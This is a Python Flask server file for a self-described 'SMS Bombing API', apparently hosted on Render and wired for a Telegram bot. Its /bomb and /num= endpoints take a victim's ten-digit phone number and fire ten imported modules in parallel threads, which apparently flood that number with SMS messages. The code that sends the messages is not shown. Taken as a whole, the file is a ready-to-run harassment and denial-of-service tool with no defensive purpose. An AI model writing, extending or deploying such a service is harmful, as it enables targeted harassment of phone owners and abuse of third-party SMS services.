from flask import Flask, jsonify, request
import threading
import time
import os
import logging

app = Flask(__name__)

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# ----------------- Safe Import Helper -----------------
def safe_import(module_name, func_name):
    try:
        mod = __import__(module_name)
        return getattr(mod, func_name)
    except Exception:
        # fallback dummy function if module not found
        def dummy(mobile_no):
            logger.info(f"{func_name} skipped (module {module_name}.py not found)")
        return dummy

# ----------------- Import All API Modules -----------------
run_apis1 = safe_import("apis1", "run_apis1")
run_apis2 = safe_import("apis2", "run_apis2")
run_apis3 = safe_import("apis3", "run_apis3")
run_apis4 = safe_import("apis4", "run_apis4")
run_apis5 = safe_import("apis5", "run_apis5")
run_apis6 = safe_import("apis6", "run_apis6")
run_apis7 = safe_import("apis7", "run_apis7")
run_apis8 = safe_import("apis8", "run_apis8")
run_apis9 = safe_import("apis9", "run_apis9")
run_apis10 = safe_import("apis10", "run_apis10")

all_apis = [
    run_apis1, run_apis2, run_apis3, run_apis4, run_apis5,
    run_apis6, run_apis7, run_apis8, run_apis9, run_apis10
]

# ----------------- Request Validation -----------------
def validate_mobile_number(mobile_no):
    """Validate mobile number format"""
    if not mobile_no or not isinstance(mobile_no, str):
        return False
    # Basic validation - 10 digits
    return mobile_no.isdigit() and len(mobile_no) == 10

def run_api(api_func, number):
    """Helper function to run APIs"""
    try:
        api_func(number)
        logger.debug(f"API {api_func.__name__} executed successfully for {number}")
    except Exception as e:
        logger.error(f"Error in {api_func.__name__}: {e}")

# ----------------- Flask Routes -----------------
@app.route('/bomb', methods=['POST'])
def trigger_apis():
    """Main bombing endpoint optimized for Telegram bot"""
    try:
        data = request.get_json()
        
        if not data:
            return jsonify({"error": "JSON data required"}), 400
        
        mobile_no = data.get('number')
        
        # Validate mobile number
        if not validate_mobile_number(mobile_no):
            return jsonify({
                "error": "Invalid mobile number format",
                "message": "Must be 10 digits without country code"
            }), 400
        
        client_ip = request.remote_addr
        
        logger.info(f"🚀 Bombing started for {mobile_no} from {client_ip}")

        # Run each API in separate thread
        for api_func in all_apis:
            threading.Thread(target=run_api, args=(api_func, mobile_no), daemon=True).start()

        return jsonify({
            "status": "success",
            "message": "SMS bombing initiated successfully",
            "data": {
                "mobile": mobile_no,
                "apis_triggered": len(all_apis),
                "timestamp": time.time()
            }
        })
        
    except Exception as e:
        logger.error(f"Error in /bomb endpoint: {e}")
        return jsonify({"error": "Internal server error"}), 500

@app.route('/bomb', methods=['GET'])
def bomb_get():
    """GET endpoint for backward compatibility"""
    mobile_no = request.args.get('number')
    
    if not mobile_no:
        return jsonify({"error": "Missing 'number' parameter"}), 400
    
    # Validate mobile number
    if not validate_mobile_number(mobile_no):
        return jsonify({
            "error": "Invalid mobile number format",
            "message": "Must be 10 digits without country code"
        }), 400
    
    client_ip = request.remote_addr
    logger.info(f"🚀 Bombing started for {mobile_no} from {client_ip}")

    # Run bombing in threads
    for api_func in all_apis:
        threading.Thread(target=run_api, args=(api_func, mobile_no), daemon=True).start()

    return jsonify({
        "status": "success",
        "message": "SMS bombing initiated successfully",
        "data": {
            "mobile": mobile_no,
            "apis_triggered": len(all_apis),
            "timestamp": time.time()
        }
    })

@app.route('/num=<mobile_no>', methods=['GET'])
def legacy_endpoint(mobile_no):
    """Legacy endpoint support"""
    # Validate mobile number
    if not validate_mobile_number(mobile_no):
        return jsonify({
            "error": "Invalid mobile number format. Must be 10 digits."
        }), 400
    
    client_ip = request.remote_addr
    logger.info(f"🚀 Bombing started for {mobile_no} from {client_ip}")

    # Run each API in separate thread
    for api_func in all_apis:
        threading.Thread(target=run_api, args=(api_func, mobile_no), daemon=True).start()

    return jsonify({
        "status": "Bombing Start",
        "mobile": mobile_no,
        "apis_triggered": len(all_apis),
        "timestamp": time.time()
    })

@app.route('/status', methods=['GET'])
def status():
    """API status endpoint"""
    active_apis = sum(1 for api in all_apis if not api.__name__.startswith('dummy'))
    
    return jsonify({
        "status": "API is running",
        "active_apis": active_apis,
        "total_apis": len(all_apis),
        "environment": "Render",
        "security": "Open for Telegram Bot"
    })

@app.route('/')
def home():
    return jsonify({
        "message": "SMS Bombing API - HOSTED ON RENDER",
        "usage": "POST /bomb with JSON: {'number': '1234567890'} OR GET /bomb?number=1234567890",
        "endpoints": {
            "bombing_post": "POST /bomb",
            "bombing_get": "GET /bomb?number=1234567890",
            "legacy": "GET /num=1234567890",
            "status": "/status"
        },
        "hosting": "Render"
    })

# ----------------- Additional Security Headers -----------------
@app.after_request
def set_security_headers(response):
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['X-XSS-Protection'] = '1; mode=block'
    response.headers['Server'] = 'Render-SMS-API'
    return response

# ----------------- Error Handlers -----------------
@app.errorhandler(404)
def not_found(error):
    return jsonify({"error": "Endpoint not found"}), 404

@app.errorhandler(500)
def internal_error(error):
    return jsonify({"error": "Internal server error"}), 500

# ----------------- Render Specific Configuration -----------------
if __name__ == '__main__':
    port = int(os.environ.get("PORT", 7887))
    
    print("=" * 60)
    print("🚀 SMS Bombing API Starting on Render...")
    print(f"📍 Port: {port}")
    print(f"🌐 Environment: Production")
    print(f"📈 Active APIs: {sum(1 for api in all_apis if not api.__name__.startswith('dummy'))}/{len(all_apis)}")
    print("=" * 60)
    print("✅ READY: Hosted on Render - Telegram Bot Compatible!")
    print("=" * 60)
    
    app.run(debug=False, host='0.0.0.0', port=port, threaded=True)
